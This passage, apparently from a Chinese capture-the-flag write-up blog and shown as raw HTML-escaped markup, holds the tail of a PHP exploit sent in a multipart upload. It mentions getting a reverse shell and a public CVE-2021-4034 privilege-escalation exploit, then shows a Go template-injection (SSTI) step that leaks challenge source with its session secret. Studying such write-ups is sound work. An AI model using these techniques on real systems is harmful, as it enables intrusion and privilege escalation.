class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$format&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$val&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(LOGGING) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            printf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;$format&amp;#125;&lt;/span&gt;\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$val&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;alloc&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$size&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; str_shuffle(str_repeat(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$size&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;------WebKitFormBoundaryj28zfvoWVxnHdp29--&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105915.png&#34; alt=&#34;image-20220212170045711&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;权限不够拿 flag，反弹 shell，用 https://github.com/arthepsy/CVE-2021-4034 提权，然后拿 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105567.png&#34; alt=&#34;image-20220212170553826&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;gocalc0&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gocalc0&#34;&gt;#&lt;/a&gt; gocalc0&lt;/h3&gt;
&lt;p&gt;测试 &lt;code&gt;&amp;#123;&amp;#123;.&amp;#125;&amp;#125;&lt;/code&gt;  存在 SSTI，拿到源码&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105844.png&#34; alt=&#34;image-20220212170806474&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight go&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; main&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; (&lt;br&gt;	_ &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;embed&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;reflect&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;strings&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;text/template&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;github.com/gin-contrib/sessions&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;github.com/gin-contrib/sessions/cookie&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;github.com/gin-gonic/gin&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;github.com/maja42/goval&amp;quot;&lt;/span&gt;&lt;br&gt;)&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//go:embed template/index.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; tpl &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//go:embed main.go&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; source &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; Eval &lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; &amp;#123;&lt;br&gt;	E &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;`json:&amp;quot;e&amp;quot; form:&amp;quot;e&amp;quot; binding:&amp;quot;required&amp;quot;`&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-params&#34;&gt;(e Eval)&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Result&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;, error)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;	eval := goval.NewEvaluator()&lt;br&gt;	result, err := eval.Evaluate(e.E, &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt;)&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, err&lt;br&gt;	&amp;#125;&lt;br&gt;	t := reflect.ValueOf(result).Type().Kind()&lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; t == reflect.Int &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fmt.Sprintf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, result.(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)), &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt;&lt;br&gt;	&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; t == reflect.String &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result.(&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;), &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt;&lt;br&gt;	&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, fmt.Errorf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;not valid type&amp;quot;&lt;/span&gt;)&lt;br&gt;	&amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-params&#34;&gt;(e Eval)&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;string&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;	res, err := e.Result()&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;br&gt;		fmt.Println(err)&lt;br&gt;		res = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;invalid&amp;quot;&lt;/span&gt;&lt;br&gt;	&amp;#125;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fmt.Sprintf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s = %s&amp;quot;&lt;/span&gt;, e.E, res)&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;render&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;	session := sessions.Default(c)&lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; his &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; session.Get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;history&amp;quot;&lt;/span&gt;) == &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;br&gt;		his = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;	&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;		his = session.Get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;history&amp;quot;&lt;/span&gt;).(&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;br&gt;	&amp;#125;&lt;br&gt;&lt;br&gt;	fmt.Println(strings.ReplaceAll(tpl, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;#123;&amp;#123;result&amp;#125;&amp;#125;&amp;quot;&lt;/span&gt;, his))&lt;br&gt;	t, err := template.New(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;index&amp;quot;&lt;/span&gt;).Parse(strings.ReplaceAll(tpl, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;#123;&amp;#123;result&amp;#125;&amp;#125;&amp;quot;&lt;/span&gt;, his))&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;br&gt;		fmt.Println(err)&lt;br&gt;		c.String(&lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;internal error&amp;quot;&lt;/span&gt;)&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;&lt;br&gt;	&amp;#125;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err := t.Execute(c.Writer, &lt;span class=&#34;hljs-keyword&#34;&gt;map&lt;/span&gt;[&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;]&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;&amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;s0uR3e&amp;quot;&lt;/span&gt;: source,&lt;br&gt;	&amp;#125;); err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;br&gt;		fmt.Println(err)&lt;br&gt;	&amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;	port := os.Getenv(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;PORT&amp;quot;&lt;/span&gt;)&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; port == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &amp;#123;&lt;br&gt;		port = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;8080&amp;quot;&lt;/span&gt;&lt;br&gt;	&amp;#125;&lt;br&gt;&lt;br&gt;	r := gin.Default()&lt;br&gt;	store := cookie.NewStore([]&lt;span class=&#34;hljs-keyword&#34;&gt;byte&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;woW_you-g0t_sourcE_co6e&amp;quot;&lt;/span&gt;))&lt;br&gt;	r.Use(sessions.Sessions(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;session&amp;quot;&lt;/span&gt;, store))&lt;br&gt;&lt;br&gt;	r.GET(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;		render(c)&lt;br&gt;	&amp;#125;)&lt;br&gt;&lt;br&gt;	r.GET(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/flag&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;		session := sessions.Default(c)&lt;br&gt;		session.Set(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;FLAG&amp;quot;&lt;/span&gt;, os.Getenv(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;FLAG&amp;quot;&lt;/span&gt;))&lt;br&gt;		session.Save()&lt;br&gt;		c.String(&lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag is in your session&amp;quot;&lt;/span&gt;)&lt;br&gt;	&amp;#125;)&lt;br&gt;&lt;br&gt;	r.POST(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;		session := sessions.Default(c)&lt;br&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; his &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;&lt;br&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; session.Get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;history&amp;quot;&lt;/span&gt;) == &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;br&gt;			his = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;		&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;			his = session.Get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;history&amp;quot;&lt;/span&gt;).(&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;br&gt;		&amp;#125;&lt;br&gt;&lt;br&gt;		eval := Eval&amp;#123;&amp;#125;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err := c.ShouldBind(&amp;amp;eval); err == &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;br&gt;			his = his + eval.String() + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;		&amp;#125;&lt;br&gt;		session.Set(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;history&amp;quot;&lt;/span&gt;, his)&lt;br&gt;		session.Save()&lt;br&gt;		render(c)&lt;br&gt;	&amp;#125;)&lt;br&gt;&lt;br&gt;	r.Run(fmt.Sprintf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;:%s&amp;quot;&lt;/span&gt;, port))&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;exp&lt;/p&gt;
